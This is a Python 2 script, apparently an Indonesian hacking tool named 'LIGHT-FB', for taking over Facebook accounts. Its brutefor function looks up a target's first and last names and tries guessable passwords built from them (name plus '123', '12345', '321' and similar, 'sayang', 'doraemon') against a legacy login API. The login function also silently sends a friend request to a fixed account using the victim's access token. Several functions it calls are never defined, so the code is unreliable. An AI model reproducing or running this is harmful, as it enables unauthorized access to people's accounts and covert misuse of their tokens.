#!/usr/bin/python
# coding=utf-8
# (Dirgantara)Ucu sangek
#LIGHT-FB brute-force-mini-login
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

try:
        import requests
except ImportError:
        os.system("pip2 install requests")
try:
          import mechanize
except ImportError:
	      os.system("pip2 install mechanize")        



##### LOGO #####
logo = """
╻   ┏━╸╻ ╻╺┳  ┏━╸┏┓
┃  ┃┃╺┓┣━┫ ┃ ╸┣╸ ┣┻┓
┗━╸╹┗━┛╹ ╹ ╹  ╹  ┗━┛ V.1.8"""





##### LOGIN #####
#================#
def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		print('\033[1;91m[☆] \033[1;93mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def brutefor():
        try:
                token = open("token.txt", "r").read()

        except IOError:
                os.system("rm -f token.txt")

        else:
                print
                print " ======================================"
                target = raw_input(" [#] Masukan ID Target: ")
                print " ======================================"
                urldev = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
                jsl = json.loads(urldev.text)

                pas1 = jsl["first_name"] + "123"
                print " [+] " + pas1
                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pas1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                js = json.load(dev)
                if "access_token" in js:
                        print " Found : " + pas1
                elif "www.facebook" in js["error_msg"]:
                        print " Cekpoint : " + pas1
                else:
                        pas2 = jsl["first_name"] + "12345"
                        print " [+] " + pas2
                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pas2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        js = json.load(dev)
                        if "access_token" in js:
                                print " Found : " + pas2
                        elif "www.facebook.com" in js["error_msg"]:
                                print " Cekpoint :" + pas2
                        else:
                                san3 = jsl["first_name"] + "321"
                                print " [+] " + san3
                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                js = json.load(dev)
                                if "access_token" in js:
                                        print " Found : " + san3
                                elif "www.facebook.com" in js["error_msg"]:
                                        print " Cekpoint : " + san3
                                else:
                                        san4 = jsl["first_name"] + "54321"
                                        print " [+] " + san4
                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        js = json.load(dev)
                                        if "access_token" in js:
                                                print " Found : " + san4
                                        elif "www.facebook.com" in js["error_msg"]:
                                                print " Cekpoint : " + san4
                                        else:
                                                san5 = jsl["last_name"] + "123"
                                                print " [+] " + san5
                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                js = json.load(dev)
                                                if "access_token" in js:
                                                        print " Found : " + san5
                                                elif "www.facebook.com" in js["error_msg"]:
                                                        print " Cekpoint : " + san5
                                                else:
                                                        san6 = jsl["last_name"] + "12345"
                                                        print " [+] " + san6
                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        js = json.load(dev)
                                                        if "access_token" in js:
                                                                print "  Found : " + san6
                                                        elif "www.facebook.com" in js["error_msg"]:
                                                                print "  Cekpoint : " + san6
                                                        else:
                                                                san7 = jsl["last_name"] + "321"
                                                                print " [+] " + san7
                                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                js = json.load(dev)
                                                                if "access_token" in js:
                                                                        print "  Found : " + san7
                                                                elif "www.facebook.com" in js["error_msg"]:
                                                                        print "  Cekpoint : " + san7
                                                                else:
                                                                        san8 = jsl["last_name"] + "54321"
                                                                        print " [+] " + san8
                                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        js = json.load(dev)
                                                                        if "access_token" in js:
                                                                                print "  Found : " + san8
                                                                        elif "www.facebook.com" in js["error_msg"]:
                                                                                print "  Cekpoint : " + san8
                                                                        else:
                                                                                san9 = "sayang"
                                                                                print " [+] " + san9
                                                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                js = json.load(dev)
                                                                                if "access_token" in js:
                                                                                        print "  Found : " + san9
                                                                                elif "www.facebook.com" in js["error_msg"]:
                                                                                        print "  Cekpoint : " + san9
                                                                                else:
                                                                                        san10 = "doraemon"
                                                                                        print " [+] " + san10
                                                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        js = json.load(dev)
                                                                                        if "access_token" in js:
                                                                                                print "  Found : " + san10
                                                                                        elif "www.facebook.com" in js["error_msg"]:
                                                                                                print "  Cekpoint : " + san10
                                                                                        else:
                                                                                                print 
                                                                                                print "  Gagalll..."
                                                                                                print " ==============================="
                                                                                                

                                                                        



def main():
        login()

if __name__=="__main__":
        login()
